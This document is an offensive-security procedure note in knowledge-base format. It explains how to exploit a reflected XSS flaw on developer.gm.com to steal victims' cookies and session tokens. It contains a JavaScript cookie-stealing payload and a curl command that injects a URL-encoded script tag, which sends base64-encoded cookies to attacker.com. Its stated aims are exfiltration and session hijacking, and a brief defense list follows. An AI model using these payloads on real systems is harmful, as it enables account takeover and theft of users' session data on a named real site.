---
tags:
  - xss
  - execution
  - exfiltration
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-inject-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:30.966Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 5050650f-317c-419a-b3d1-dc5328356c95
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject and Execute Malicious JavaScript

## Summary

This procedure exploits an identified XSS vulnerability by injecting a malicious JavaScript payload into a vulnerable parameter on developer.gm.com, executing arbitrary code in the victim's browser to steal data like cookies or session tokens.

## Description

Following parameter identification, craft and deliver a payload that runs in the context of the victim's session. For the developer.gm.com case, a reflected XSS allows immediate execution upon page load. Technical approach: URL-encode the script and append to the parameter. Prerequisites: Valid vulnerable endpoint and an exfiltration server. Outcomes: Data sent to attacker, potential account takeover.

## Requirements

1. Identified vulnerable parameter from prior recon
2. Attacker-controlled server for data receipt (e.g., ngrok or VPS)
3. Proxy for payload crafting

## Defense

Defensive measures and detection strategies:

- Deploy web application firewall (WAF) rules to block script tags
- Enable HTTP-only and secure flags on cookies
- Log and alert on suspicious outbound requests from browser

## Objectives

1. Execute JS in victim context
2. Exfiltrate sensitive data
3. Maintain access via session hijacking

## Instructions

### Step 1: Craft Malicious Payload

**Context**: Build a script to capture and send data to attacker.

**Instructions**: Use JS like `fetch('http://attacker.com?cookie='+document.cookie)`.

### Step 2: Inject via Request

**Context**: Modify the request to include the payload in the parameter.

**Command** ([[commands/curl-inject-payload]]):
```bash
curl -X GET "https://developer.gm.com/search?query=%3Cscript%3Efetch('http://attacker.com/steal?data='+btoa(document.cookie))%3C/script%3E" -v
```

> Encoded payload sends base64-encoded cookies to attacker. Expected output: 200 OK response; check attacker server for incoming data when victim loads the URL.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-inject-payload]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- xss-exploitation
- javascript
